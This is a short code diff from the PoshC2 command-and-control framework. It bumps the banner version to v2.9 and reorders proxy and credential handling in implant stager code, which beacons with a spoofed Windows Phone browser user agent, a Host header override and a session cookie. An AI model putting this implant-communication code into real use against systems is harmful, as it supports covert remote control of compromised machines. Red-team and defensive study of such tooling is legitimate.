@@ -62,7 +62,7 @@ function Implant-Handler
             Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
             Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
             Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
-            Write-Host "============== v2.8 www.PoshC2.co.uk ==============" -ForegroundColor Green
+            Write-Host "============== v2.9 www.PoshC2.co.uk ==============" -ForegroundColor Green
             Write-Host "===================================================" `n -ForegroundColor Green
 
             foreach ($implant in $dbresults) 
@@ -357,14 +357,14 @@ if ($h) {$wc.Headers.Add("Host",$h)}
 $wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
 if ($proxyurl) {
 $wp = New-Object System.Net.WebProxy($proxyurl,$true); 
-$wc.Proxy = $wp;
-}
 if ($username -and $password) {
 $PSS = ConvertTo-SecureString $password -AsPlainText -Force; 
 $getcreds = new-object system.management.automation.PSCredential $username,$PSS; 
 $wp.Credentials = $getcreds;
 } else {
 $wc.UseDefaultCredentials = $true; 
+}
+$wc.Proxy = $wp;
 }
 if ($cookie) {
 $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
